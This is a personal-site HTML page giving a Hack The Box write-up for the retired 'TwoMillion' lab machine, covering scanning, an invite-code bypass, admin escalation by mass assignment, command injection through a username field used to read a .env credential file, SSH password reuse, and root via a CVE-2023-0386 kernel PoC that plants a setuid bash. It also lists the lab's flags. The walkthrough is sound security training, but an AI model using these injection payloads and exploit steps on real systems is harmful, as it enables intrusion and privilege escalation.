@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>TwoMillion — HTB Writeup · Arthur Trapp</title>
+<meta name="description" content="API mass-assignment → command injection → OverlayFS/FUSE kernel exploit (CVE-2023-0386)" />
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='6' fill='%23181a1e'/%3E%3Ctext x='16' y='23' font-family='monospace' font-size='18' fill='%23f79c42' text-anchor='middle'%3E$%3C/text%3E%3C/svg%3E" />
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet" />
+<link rel="stylesheet" href="../assets/style.css" />
+</head>
+<body>
+<header>
+  <div class="wrap nav">
+    <a class="nav-brand" href="../index.html">arthur<span class="at">@</span>trapp</a>
+    <nav class="nav-links" aria-label="Primary">
+      <a href="../index.html#about">about</a>
+      <a href="../index.html#projects">projects</a>
+      <a class="active" href="index.html">writeups</a>
+      <a href="../index.html#contact">contact</a>
+    </nav>
+  </div>
+</header>
+<main>
+  <div class="page-hero">
+    <div class="wrap">
+      <div class="crumb"><a href="../index.html">~</a> / <a href="index.html">writeups</a> / twomillion</div>
+      <h1>TwoMillion</h1>
+      <p class="sub">Hack The Box · <span class="accent">Easy</span> · Linux</p>
+      <div class="meta-tags">
+        <span class="green">Easy</span>
+        <span>Linux</span>
+        <span class="accent">User + Root owned</span>
+      </div>
+    </div>
+  </div>
+  <article class="content wrap">
+<h2>Machine Overview</h2>
+<div class="table-scroll"><table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Name</td>
+<td>TwoMillion</td>
+</tr>
+<tr>
+<td>Difficulty</td>
+<td>Easy</td>
+</tr>
+<tr>
+<td>OS</td>
+<td>Linux (Ubuntu 22.04)</td>
+</tr>
+<tr>
+<td>IP</td>
+<td>10.129.229.66</td>
+</tr>
+<tr>
+<td>Vhost</td>
+<td><code>2million.htb</code></td>
+</tr>
+<tr>
+<td>Kernel</td>
+<td>5.15.70-051570-generic</td>
+</tr>
+<tr>
+<td>Ports</td>
+<td>22 (SSH / OpenSSH 8.9p1), 80 (nginx)</td>
+</tr>
+<tr>
+<td>Released / Retired</td>
+<td>2023-06-07 / Retired</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>Attack surface summary:</strong> A clone of the <em>old</em> Hack The Box platform (the "Two Million" subscriber-era front page). Two services: SSH and an nginx-hosted PHP web app that redirects to <code>2million.htb</code>. The web app exposes a JSON API (<code>/api/v1</code>) with user and admin routes, plus the legacy invite-code registration flow.</p>
+<h2>Flags</h2>
+<div class="table-scroll"><table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>User (<code>/home/admin/user.txt</code>)</td>
+<td><code>6686adbfa7300956a23ec90bf481a941</code></td>
+</tr>
+<tr>
+<td>Root (<code>/root/root.txt</code>)</td>
+<td><code>ecc37a35b70c06c32fe0fa101659180b</code></td>
+</tr>
+</tbody>
+</table></div>
+<hr />
+<h2>Reconnaissance</h2>
+<p>Full port scan:</p>
+<pre><code class="language-bash">nmap -p- --min-rate 5000 10.129.229.66
+# 22/tcp open  ssh
+# 80/tcp open  http
+</code></pre>
+<p>Service detection:</p>
+<pre><code class="language-bash">nmap -sCV -p 22,80 10.129.229.66
+# 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
+# 80/tcp open  http    nginx
+# |_http-title: Did not follow redirect to http://2million.htb/
+</code></pre>
+<p>The web root issues a 301 to <code>http://2million.htb/</code>. Since the Windows attack host cannot edit <code>/etc/hosts</code> without admin, all HTTP calls used <code>curl --resolve</code>:</p>
+<pre><code class="language-bash">curl -s --resolve 2million.htb:80:10.129.229.66 -H &quot;Host: 2million.htb&quot; http://2million.htb/
+</code></pre>
+<hr />
+<h2>Attack Chain</h2>
+<h3>1. Invite-code bypass (registration)</h3>
+<p>The <code>/invite</code> page loads <code>/js/inviteapi.min.js</code>, an <code>eval</code>-packed blob that, after deobfuscation, reveals two AJAX helpers:</p>
+<ul>
+<li><code>makeInviteCode()</code> → <code>POST /api/v1/invite/how/to/generate</code></li>
+<li><code>verifyInviteCode(code)</code> → <code>POST /api/v1/invite/verify</code></li>
+</ul>
+<pre><code class="language-bash">curl -s --resolve 2million.htb:80:10.129.229.66 -H &quot;Host: 2million.htb&quot; \
+  -X POST http://2million.htb/api/v1/invite/how/to/generate
+# {&quot;0&quot;:200,&quot;success&quot;:1,&quot;data&quot;:{&quot;data&quot;:&quot;Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr&quot;,&quot;enctype&quot;:&quot;ROT13&quot;}, ...}
+</code></pre>
+<p>The <code>data</code> field is ROT13-encoded. Decoding it gives:</p>
+<blockquote>
+<p>"In order to generate the invite code, make a POST request to /api/v1/invite/generate"</p>
+</blockquote>
+<pre><code class="language-bash">curl -s --resolve 2million.htb:80:10.129.229.66 -H &quot;Host: 2million.htb&quot; \
+  -X POST http://2million.htb/api/v1/invite/generate
+# {&quot;0&quot;:200,&quot;success&quot;:1,&quot;data&quot;:{&quot;code&quot;:&quot;UDIwUkYtUkwwQTMtUVRZMVYtNlFRTk0=&quot;,&quot;format&quot;:&quot;encoded&quot;}}
+
+echo &quot;UDIwUkYtUkwwQTMtUVRZMVYtNlFRTk0=&quot; | base64 -d
+# P20RF-RL0A3-QTY1V-6QQNM
+</code></pre>
+<p>Registered a fresh user at <code>POST /api/v1/user/register</code> (form-encoded — the endpoint rejects JSON with "Please fill in all fields"):</p>
+<pre><code>code=P20RF-RL0A3-QTY1V-6QQNM
+username=&lt;attacker&gt;
+email=&lt;attacker&gt;@htb.local
+password=HtbPassw0rd!1
+</code></pre>
+<p>Then logged in via <code>POST /api/v1/user/login</code> (form-encoded) to obtain a <code>PHPSESSID</code>.</p>
+<h3>2. API enumeration &amp; mass-assignment privilege escalation</h3>
+<p><code>GET /api/v1</code> with the authenticated session cookie returns the full route map:</p>
+<pre><code class="language-json">{
+  &quot;v1&quot;: {
+    &quot;user&quot;: {
+      &quot;GET&quot;:  { &quot;/api/v1/user/vpn/generate&quot;: &quot;...&quot;, &quot;/api/v1/user/vpn/regenerate&quot;: &quot;...&quot;, &quot;/api/v1/user/vpn/download&quot;: &quot;...&quot; },
+      &quot;POST&quot;: { &quot;/api/v1/user/register&quot;: &quot;...&quot;, &quot;/api/v1/user/login&quot;: &quot;...&quot; }
+    },
+    &quot;admin&quot;: {
+      &quot;GET&quot;:  { &quot;/api/v1/admin/auth&quot;: &quot;Check if user is admin&quot; },
+      &quot;POST&quot;: { &quot;/api/v1/admin/vpn/generate&quot;: &quot;Generate VPN for specific user&quot; },
+      &quot;PUT&quot;:  { &quot;/api/v1/admin/settings/update&quot;: &quot;Update user settings&quot; }
+    }
+  }
+}
+</code></pre>
+<p>The <code>PUT /api/v1/admin/settings/update</code> endpoint trusts a client-supplied <code>is_admin</code> field (broken access control / mass assignment):</p>
+<pre><code class="language-bash">curl -s --resolve 2million.htb:80:10.129.229.66 -H &quot;Host: 2million.htb&quot; \
+  -H &quot;Content-Type: application/json&quot; -b &quot;PHPSESSID=&lt;sid&gt;&quot; -X PUT \
+  -d '{&quot;email&quot;:&quot;&lt;attacker&gt;@htb.local&quot;,&quot;is_admin&quot;:1}' \
+  http://2million.htb/api/v1/admin/settings/update
+# {&quot;id&quot;:13,&quot;username&quot;:&quot;&lt;attacker&gt;&quot;,&quot;is_admin&quot;:1}
+</code></pre>
+<p><code>GET /api/v1/admin/auth</code> now returns <code>{"message":true}</code> — we are admin.</p>
+<h3>3. Command injection → initial foothold</h3>
+<p><code>POST /api/v1/admin/vpn/generate</code> concatenates the <code>username</code> field into a shell command without sanitization:</p>
+<pre><code class="language-bash">curl -s --resolve 2million.htb:80:10.129.229.66 -H &quot;Host: 2million.htb&quot; \
+  -H &quot;Content-Type: application/json&quot; -b &quot;PHPSESSID=&lt;sid&gt;&quot; -X POST \
+  -d '{&quot;username&quot;:&quot;x;id;whoami;hostname;&quot;}' \
+  http://2million.htb/api/v1/admin/vpn/generate
+# uid=33(www-data) gid=33(www-data) groups=33(www-data)
+# www-data
+# 2million
+</code></pre>
+<p>Command output is echoed straight back in the response body — perfect for blind commands. Used this to read the web app <code>.env</code>:</p>
+<pre><code class="language-bash">-d '{&quot;username&quot;:&quot;x;cat /var/www/html/.env;&quot;}'
+# DB_HOST=127.0.0.1
+# DB_DATABASE=htb_prod
+# DB_USERNAME=admin
+# DB_PASSWORD=SuperDuperPass123
+</code></pre>
+<h3>4. Credential reuse → user shell</h3>
+<p>The <code>.env</code> database password <code>SuperDuperPass123</code> was reused for the system account <code>admin</code>, so SSH worked directly:</p>
+<pre><code class="language-bash">ssh admin@2million.htb   # password: SuperDuperPass123
+</code></pre>
+<p>Read the user flag:</p>
+<pre><code class="language-bash">cat /home/admin/user.txt
+# 6686adbfa7300956a23ec90bf481a941
+</code></pre>
+<h3>5. Kernel exploit → root</h3>
+<p><code>/var/mail/admin</code> contained mail from <code>ch4p</code> warning about a serious Linux kernel CVE in "OverlayFS / FUSE":</p>
+<pre><code>From: ch4p &lt;ch4p@2million.htb&gt;
+Subject: Urgent: Patch System OS
+...
+There have been a few serious Linux kernel CVEs already this year.
+That one in OverlayFS / FUSE looks nasty. We can't get popped by that.
+</code></pre>
+<p>The kernel <code>5.15.70-051570-generic</code> is vulnerable to <strong>CVE-2023-0386</strong> (OverlayFS file-capability copy-up, kernels &lt; 6.2). The box had <code>gcc 11.3.0</code> and <code>libfuse-dev 2.9.9</code> installed, so the PoC compiled directly on target.</p>
+<p>Used the <code>xkaneiki/CVE-2023-0386</code> PoC (<code>fuse.c</code>, <code>exp.c</code>, <code>getshell.c</code>), with <code>getshell.c</code> adjusted to print the flag and drop a persistent setuid <code>bash</code> instead of spawning an interactive shell (the SSH exec channel is non-interactive):</p>
+<pre><code class="language-c">setuid(0); setgid(0);
+system(&quot;id&quot;);
+system(&quot;cp /bin/bash /tmp/rb &amp;&amp; chmod 4755 /tmp/rb&quot;);
+system(&quot;cat /root/root.txt&quot;);
+</code></pre>
+<p>Compile &amp; run:</p>
+<pre><code class="language-bash">gcc fuse.c -o fuse -D_FILE_OFFSET_BITS=64 -static -pthread -lfuse -ldl
+gcc -o exp exp.c -lcap
+gcc -o gc getshell.c
+
+mkdir -p ovlcap/lower ovlcap/work ovlcap/upper ovlcap/merge   # pre-create tree
+./fuse ./ovlcap/lower ./gc &amp;
+./exp
+</code></pre>
+<p>Output confirmed the setuid copy-up and root execution:</p>
+<pre><code>-rwsrwxrwx 1 nobody nogroup 16096 ... file      # setuid bit survived copy-up
+[+] mount success
+uid=0(root) gid=0(root) groups=0(root),1000(admin)
+ecc37a35b70c06c32fe0fa101659180b               # root flag
+</code></pre>
+<p>Root flag:</p>
+<pre><code>ecc37a35b70c06c32fe0fa101659180b
+</code></pre>
+<hr />
+<h2>Techniques Demonstrated</h2>
+<ol>
+<li><strong>JS deobfuscation</strong> — eval-packed JS → ROT13 + Base64 invite-code logic.</li>
+<li><strong>API route-map discovery</strong> — <code>GET /api/v1</code> leaks the entire endpoint list.</li>
+<li><strong>Broken access control / mass assignment</strong> — <code>PUT /admin/settings/update</code> honors client <code>is_admin:1</code> with no authz check.</li>
+<li><strong>Command injection</strong> — unsanitized <code>username</code> in VPN generation; output echoed in response.</li>
+<li><strong>Credential reuse</strong> — <code>.env</code> DB password = system <code>admin</code> password.</li>
+<li><strong>Kernel CVE from mail hint</strong> — <code>/var/mail/admin</code> → OverlayFS/FUSE → CVE-2023-0386.</li>
+</ol>
+<h2>Tools Used</h2>
+<p>nmap, curl (with <code>--resolve</code>), Python <code>paramiko</code> (SSH/SFTP for file transfer and command execution on target), gcc, libfuse/libcap, CVE-2023-0386 PoC.</p>
+    <a class="back-link" href="index.html">← all writeups</a>
+  </article>
+</main>
+<footer>
+  <div class="wrap footer-row">
+    <span>© 2026 Arthur Trapp · Rochester, NY</span>
+    <span class="clearance">ACTIVE TS/SCI CLEARANCE</span>
+  </div>
+</footer>
+<script>
+  const io = new IntersectionObserver((es) => {
+    es.forEach(e => { if (e.isIntersecting) { e.target.classList.add('visible'); io.unobserve(e.target); } });
+  }, { threshold: 0.1 });
+  document.querySelectorAll('.content h2, .content h3, .content p, .content pre, .content table, .content ul, .content ol, .content blockquote').forEach(el => io.observe(el));
+</script>
+</body>
+</html>
